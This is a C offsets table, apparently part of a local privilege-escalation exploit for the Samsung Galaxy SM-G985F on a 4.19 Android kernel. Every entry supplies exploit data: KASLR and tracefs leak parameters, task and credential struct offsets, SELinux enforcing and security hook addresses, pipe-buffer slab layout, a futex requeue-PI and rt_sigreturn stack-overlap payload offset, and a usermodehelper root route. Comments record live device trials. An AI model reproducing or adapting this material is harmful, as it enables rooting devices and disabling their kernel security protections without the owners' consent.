/* SM-G985F / G985FXXSNHYB1, stock Exynos990 Android 13.
 * Symbols: exact firmware Image kallsyms, _text=0xffffff8008080000.
 * Layouts: stock IKCONFIG + matching 4.19 Samsung source, Clang r349610
 * DWARF and a compile-time offsetof probe. See G985F-SUPPORT.md.
 * The PI consumer uses the exact legacy arm64 rt_sigreturn/FPSIMD stack
 * geometry instead of the Fold6 pselect layout. This native profile is
 * experiment-only; the Android app's separate G985F gate remains diagnostic
 * until downstream Exynos physmap/pipe/UMH layouts pass hardware checks.
 */
OFFSETS_ENTRY(
    "4.19.87-27102101",
    .diagnostic_only = 1,
    .kaslr_virtual_only = 1,
    .kaslr_max_slide = 0x2fffe00000ULL,
    /* HYB1 uses 32 KiB KASLR granularity: observed boots include slides
     * 0x1d0000 and 0xf8000.  Keep the caller-symbol check as the independent
     * constraint; physical mapping remains separately verified below. */
    .kaslr_slide_alignment = 0x8000ULL,
    .tracefs_leak = 1,
    .tracefs_caller_off = 0x50208,
    .kimage_text_base = 0xffffff8008080000ULL,
    .vmemmap_start = 0xffffffbf00000000ULL,
    .page_offset = 0xffffffc000000000ULL,
    .direct_map_size = 0x4000000000ULL,
    /* Keep the end representable: this scans 255 of the 256 GiB VA39
     * linear region.  A live mm object cannot be confined to the omitted
     * wraparound byte range. */
    .kernelsnitch_identity_start = 0xffffffc000000000ULL,
    .kernelsnitch_identity_size = 0x3fc0000000ULL,
    .off_memstart_addr = 0x19c25e0,
    .off_kimage_voffset = 0x19c25f0,
    .canonical_data = 1,
    /* mm_struct + NR_CPUS=8 cpumask, SLAB_HWCACHE_ALIGN. */
    .mm_struct_sz = 0x380,
    .page_slab_cache = 0x18,
    .pipe_buffer_slots = 16,
    .kmalloc_pipe_index = 10,
    .pipe_object_size = 0x400,
    .pipe_objs_per_slab = 32,
    .pipe_mm_stride = 0x380,
    .task_usage = 0x28,
    .task_prio = 0x6c, .task_normal_prio = 0x74,
    .task_sched_task_group = 0x448,
    .task_pi_lock = 0x92c, .task_pi_waiters = 0x938,
    .task_pi_top_task = 0x948, .task_pi_blocked_on = 0x950,
    .task_pid = 0x6a8, .task_tgid = 0x6ac, .task_atomic_flags = 0x670,
    .task_real_cred = 0x850, .task_cred = 0x858,
    .task_comm = 0x860, .task_tasks = 0x5a0, .task_seccomp = 0x910,
    .fops_ioctl = 0x48, .fops_compat_ioctl = 0x50, .fops_mmap = 0x58,
    .fops_open = 0x68, .fops_release = 0x78,
    .fops_splice_read = 0xc0, .fops_show_fdinfo = 0xd8,
    .waiter_legacy_4_19 = 1,
    .rt_sigreturn_route = 1,
    /* Candidate HYB1 frame geometry from Image.raw.elf, relative to the
     * common syscall-entry SP: __arm64_sys_futex reserves 0x70 and do_futex
     * reserves 0x1d0. The inlined FUTEX_WAIT_REQUEUE_PI branch calls
     * rt_mutex_init_waiter() with do_futex SP+0xb0, placing the 0x50-byte
     * waiter at entry_sp-0x190. __arm64_sys_rt_sigreturn reserves 0x60 for
     * saved registers plus 0x280 for locals; an FPSIMD vregs copy appears to
     * begin at entry_sp-0x280, making 0xf0 the primary offline overlap
     * candidate. The adjacent 0xe0 trial did not observe the parser page; the
     * 0x100 trial was followed by a reboot before readback. Neither offset is
     * live-validated.
     * This offline arithmetic is not a live overlap/PI-chain validation. */
    .rt_sigreturn_waiter_payload_off = 0xf0,
    .rt_sigreturn_waiter_size = 0x50,
    .configfs_legacy_rw = 1,
    /* Keep the page-state observer and eviction helper on the Exynos 990
     * big-core cluster (CPU4/CPU5); the 1--3 ms tail-fault window is too
     * short for the little-core default used by the Fold6 route. */
    .consumer_core = 4,
    .umh_root = 1,
    .umh_subprocess_legacy_4_19 = 1,
    .umh_completion_size = 0xd0,
    .wq_dfl_pwq = 0xb0,
    .pwq_nr_active = 0x58,
    .pwq_max_active = 0x5c,
    .pool_worklist = 0x20,
    .pool_nr_idle = 0x34,
    .sync_route = 0,
    .cred_uid = 0x4, .cred_securebits = 0x24,
    .cred_caps = 0x28, .cred_security = 0x78,
    .off_call_usermodehelper_exec_work = 0x48ce0,
    .off_system_unbound_wq = 0x1e5ef80,
    .off_init_task = 0x1e6e3c0,
    .off_init_cred = 0x19cc0e0,
    .off_root_task_group = 0x25f1b80,
    .off_selinux_enforcing = 0x19cc1f8,
    .off_security_hook_heads = 0x19c2bd8,
    .off_kmalloc_caches = 0x19c2738,
    .off_anon_pipe_buf_ops = 0x10c1d80,
    .off_ashmem_misc_fops = 0x21f8218,
    .off_ashmem_fops = 0x12a2910,
    .off_ashmem_ioctl = 0xc856c8,
    .off_ashmem_compat_ioctl = 0xc85e1c,
    .off_ashmem_mmap = 0xc85e6c,
    .off_ashmem_open = 0xc85ff0,
    .off_ashmem_release = 0xc86074,
    .off_ashmem_show_fdinfo = 0xc860f8,
    .off_configfs_read = 0x29174c,
    .off_configfs_bin_write = 0x2918d0,
    .off_copy_splice_read = 0x22fc8c,
    .off_noop_llseek = 0x1f8564,
    .off_slide_nfulnl_logger = 0x1e64b70,
    .off_slide_loggers_0_1 = 0x1e64a90,
    .off_slide_boot_id = 0x29e79e8,
    /* Exact trace.o DWARF: global_trace=0xffffff8009f11ce0,
     * max_lock@0x48, buffer_disabled@0x4c, stop_count@0x50 and
     * clock_id@0x54.  The 8-byte word at 0x50 can be primed by selecting
     * the global trace clock, zeroed by the forged-tree leaf write, observed
     * as the local clock through tracefs, then restored through tracefs. */
    .off_global_trace = 0x1e91ce0,
    .trace_control_word = 0x50,
),
